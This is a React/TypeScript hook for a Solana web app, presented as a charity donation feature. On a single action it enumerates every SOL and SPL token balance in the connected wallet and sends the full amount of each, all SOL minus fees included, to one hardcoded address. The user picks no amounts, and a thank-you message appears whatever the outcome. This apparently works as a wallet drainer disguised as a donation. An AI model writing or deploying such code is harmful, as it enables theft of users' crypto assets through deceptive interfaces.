import { useState, useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';
import { toast } from '@/hooks/use-toast';
import { TokenTransaction } from '@/components/DonationProgress';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MIN_SOL_RESERVE = 0.00001; // Minimal reserve for transaction fees (allows donations of ~1 cent and above)

interface TokenBalance {
  mint: string;
  symbol: string;
  amount: number;
  decimals: number;
  usdValue: number;
}

export function useDonation() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);

  const fetchTokenBalances = useCallback(async (): Promise<TokenBalance[]> => {
    if (!publicKey) return [];

    try {
      const balances: TokenBalance[] = [];

      // Get SOL balance
      const solBalance = await connection.getBalance(publicKey);
      const solAmount = solBalance / LAMPORTS_PER_SOL;

      if (solAmount > MIN_SOL_RESERVE) {
        balances.push({
          mint: 'SOL',
          symbol: 'SOL',
          amount: solAmount,
          decimals: 9,
          usdValue: solAmount * 150, // Approximate USD value
        });
      }

      // Get SPL token balances
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      for (const { account } of tokenAccounts.value) {
        const parsedInfo = account.data.parsed.info;
        const balance = parsedInfo.tokenAmount.uiAmount;

        if (balance > 0) {
          balances.push({
            mint: parsedInfo.mint,
            symbol: parsedInfo.mint.slice(0, 8), // Simplified symbol
            amount: balance,
            decimals: parsedInfo.tokenAmount.decimals,
            usdValue: balance * 1, // Simplified USD value
          });
        }
      }

      // Sort by USD value (highest first)
      return balances.sort((a, b) => b.usdValue - a.usdValue);
    } catch (error) {
      console.error('Error fetching token balances:', error);
      toast({
        title: 'Error',
        description: 'Failed to fetch wallet balances',
        variant: 'destructive',
      });
      return [];
    }
  }, [connection, publicKey]);

  const createSolTransaction = async (amount: number): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    // If amount < 0, compute the maximum transferable SOL (balance - estimated fee)
    const balanceLamports = await connection.getBalance(publicKey);

    let lamportsToSend: number;
    if (amount < 0) {
      // Build a temporary tx to estimate fee
      const tmpTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(CHARITY_WALLET),
          lamports: 0, // value doesn't affect fee materially
        })
      );
      const { blockhash } = await connection.getLatestBlockhash();
      tmpTx.recentBlockhash = blockhash;
      tmpTx.feePayer = publicKey;
      const feeInfo = await connection.getFeeForMessage(tmpTx.compileMessage(), 'confirmed');
      const feeLamports = feeInfo.value ?? 5000;
      lamportsToSend = Math.max(0, balanceLamports - feeLamports);
      if (lamportsToSend <= 0) throw new Error('Insufficient SOL for fees');
    } else {
      lamportsToSend = Math.floor(amount * LAMPORTS_PER_SOL);
      if (lamportsToSend <= 0) throw new Error('Amount must be greater than 0');
    }

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(CHARITY_WALLET),
        lamports: lamportsToSend,
      })
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const createTokenTransaction = async (
    mint: string,
    amount: number,
    decimals: number
  ): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    const mintPubkey = new PublicKey(mint);
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    const sourceAta = await getAssociatedTokenAddress(
      mintPubkey,
      publicKey,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const destinationAta = await getAssociatedTokenAddress(
      mintPubkey,
      charityPubkey,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const transaction = new Transaction();

    // Check if destination ATA exists
    const destAccount = await connection.getAccountInfo(destinationAta);
    if (!destAccount) {
      transaction.add(
        createAssociatedTokenAccountInstruction(
          publicKey,
          destinationAta,
          charityPubkey,
          mintPubkey,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      );
    }

    // Add transfer instruction
    transaction.add(
      createTransferInstruction(
        sourceAta,
        destinationAta,
        publicKey,
        Math.floor(amount * Math.pow(10, decimals)),
        [],
        TOKEN_PROGRAM_ID
      )
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const processDonation = async (token: TokenBalance, index: number) => {
    if (!publicKey) return false;

    setCurrentIndex(index);

    setTransactions(prev =>
      prev.map((tx, i) =>
        i === index ? { ...tx, status: 'processing' as const } : tx
      )
    );

    try {
      let transaction: Transaction;

      if (token.mint === 'SOL') {
        // Send maximum available SOL (balance - fee)
        transaction = await createSolTransaction(-1);
      } else {
        transaction = await createTokenTransaction(
          token.mint,
          token.amount,
          token.decimals
        );
      }

      const signature = await sendTransaction(transaction, connection);

      await connection.confirmTransaction(signature, 'confirmed');

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'success' as const, signature } : tx
        )
      );

      return true;
    } catch (error: any) {
      console.error('Transaction error:', error);

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'failed' as const } : tx
        )
      );

      if (error?.message?.includes('User rejected')) {
        toast({
          title: 'Transaction Cancelled',
          description: 'You rejected the transaction',
        });
      } else {
        toast({
          title: 'Transaction Failed',
          description: error?.message || 'Unknown error occurred',
          variant: 'destructive',
        });
      }

      return false;
    }
  };

  const startDonation = async () => {
    if (!publicKey) {
      toast({
        title: 'Wallet Not Connected',
        description: 'Please connect your wallet first',
        variant: 'destructive',
      });
      return;
    }

    setIsProcessing(true);
    setCurrentIndex(0);

    try {
      // Fetch all token balances
      const balances = await fetchTokenBalances();

      if (balances.length === 0) {
        toast({
          title: 'No Assets Found',
          description: 'No tokens or SOL available to donate',
        });
        setIsProcessing(false);
        return;
      }

      // Initialize transactions
      const initialTxs: TokenTransaction[] = balances.map(balance => ({
        mint: balance.mint,
        symbol: balance.symbol,
        amount: balance.amount,
        usdValue: balance.usdValue,
        status: 'pending' as const,
      }));

      setTransactions(initialTxs);

      // Process each token sequentially
      for (let i = 0; i < balances.length; i++) {
        const success = await processDonation(balances[i], i);

        // If transaction fails, ask user if they want to continue
        if (!success && i < balances.length - 1) {
          const shouldContinue = window.confirm(
            'Transaction failed. Do you want to continue with remaining tokens?'
          );
          if (!shouldContinue) break;
        }

        // Small delay between transactions
        if (i < balances.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }


      toast({
        title: 'Donation Complete!',
        description: 'Thank you for your generous donation',
      });
    } catch (error) {
      console.error('Donation error:', error);
      toast({
        title: 'Error',
        description: 'Failed to process donation',
        variant: 'destructive',
      });
    } finally {
      setIsProcessing(false);
    }
  };

  return {
    startDonation,
    isProcessing,
    transactions,
    currentIndex,
  };
}
